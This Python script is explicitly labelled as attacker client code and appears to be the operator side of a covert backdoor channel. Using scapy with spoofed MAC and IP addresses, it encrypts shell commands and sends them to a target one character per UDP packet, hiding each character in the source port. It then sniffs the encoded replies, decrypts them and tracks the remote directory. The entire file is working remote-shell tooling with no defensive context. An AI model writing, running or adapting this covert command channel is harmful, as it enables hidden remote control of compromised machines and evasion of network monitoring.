# Attacker client code:
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import *
import base64
from cryptography.fernet import Fernet


def load_key():
    """
    Load the previously generated key
    """
    return open(os.path.join(sys.path[0],"secret.key"), "rb").read()


# the decrypion method of the message
def theDecryption(encrypted_message):
    """
    Decrypts an encrypted message
    """
    key = load_key()
    ciphertext = base64.b64decode(encrypted_message.encode())
    f = Fernet(key)
    decrypted_message = str(f.decrypt(ciphertext))
    he = str(decrypted_message[2:len(decrypted_message) - 1])
    hhe: str = str(he).replace("\\n", "\n")
    hhe = hhe.replace("\\t", "\t")
    return (hhe)


# the encrypion method of the message
def theEncryption(message):
    """
    Encrypts a message
    """
    key = load_key()
    encoded_message = message.encode()
    f = Fernet(key)
    encrypted_message = f.encrypt(encoded_message)
    encMsg = (base64.encodebytes(encrypted_message)).decode()
    return encMsg


ip1 = "10.100.102.18"  # the ip that the target should see
ip = "101.101.101.1"  # the target ip/ (optional - it mean that its could be anything, and its still will work)...
srcMAC = "71:93:a6:80:91:ca"  # the mac add that the target should see
srcIP = "99.246.29.142"  # the ip add that the target should see
tarsrcMAC = "1d:6a:b9:df:68:0f"  # the target fake mac that the target should sniff
tarsrcIP = "67.39.210.232"  # the target fake ip that the target should sniff
lenPORT = 10
charPORT = 62344
num_of_pkts_to_come: int = 0
pwdIp = "67.39.210.230"  # ip of the current location of the terminal
pwdLocation = "command"


# send message worker
def worker(com):
    sendp(Ether(src=srcMAC) / IP(dst=ip, src=srcIP) / UDP(sport=lenPORT + len(com)))
    count = 0
    time.sleep(0.2)
    for i in com:
        count = count + 1
        port = i
        sendp(Ether(src=srcMAC)/IP(dst=ip, src=srcIP)/UDP(sport=charPORT + ord(port), dport=count))


# get message worker
def worker2(flag):
    print("\n")
    msg_arr = []
    if not flag:
        s = sniff(
            filter=str("ip and src host " + tarsrcIP + " and udp and src portrange " + str(lenPORT) + "-" + str(charPORT - 1)),
            count = 1)
        num_of_pkts_to_come = ((s[0])[UDP].sport) - lenPORT
        if num_of_pkts_to_come == 0:
            return ''
        for i in range(num_of_pkts_to_come):
            msg_arr.append(0)
        arr = sniff(filter=str("ip and src host " + tarsrcIP + " and udp and src portrange " + str(charPORT) + "-65535"),
                    count=num_of_pkts_to_come)

    if flag:
        s = sniff(
            filter=str(
                "ip and src host " + pwdIp + " and udp and src portrange " + str(lenPORT) + "-" + str(charPORT - 1)),
            count=1)
        num_of_pkts_to_come = ((s[0])[UDP].sport) - lenPORT
        if num_of_pkts_to_come == 0:
            return ''
        for i in range(num_of_pkts_to_come):
            msg_arr.append(0)
        arr = sniff(filter=str("ip and src host " + pwdIp + " and udp and src portrange " + str(charPORT) + "-65535"),
                    count=num_of_pkts_to_come)
    for i in arr:
        msg_arr[(i[UDP].dport) - 1] = chr((i[UDP].sport) - charPORT)
    msg = "".join(msg_arr)
    print(theDecryption(msg))
    return theDecryption(msg)


command = ""
while command != "q":
    pwdLocation = pwdLocation.replace(chr(10), "")
    print(pwdLocation+">>>", end="")
    command = input()  # get command from user
    count = 0
    isNotEnd = True
    while isNotEnd:
        for i in command:
            if i  ==  chr(34):
                count += 1
        if count % 2 != 0:
            command += "\n"
            command += input()
            count = 0
        else:
            isNotEnd = False

    encCommand = theEncryption(command)
    worker(encCommand)
    if command == "q":
        continue
    w2 = worker2(False)
    co = command.strip()
    if co[:2] == "cd" and len(co) >= 2 and "can't cd to" not in w2:
        pwdLocation = worker2(True)
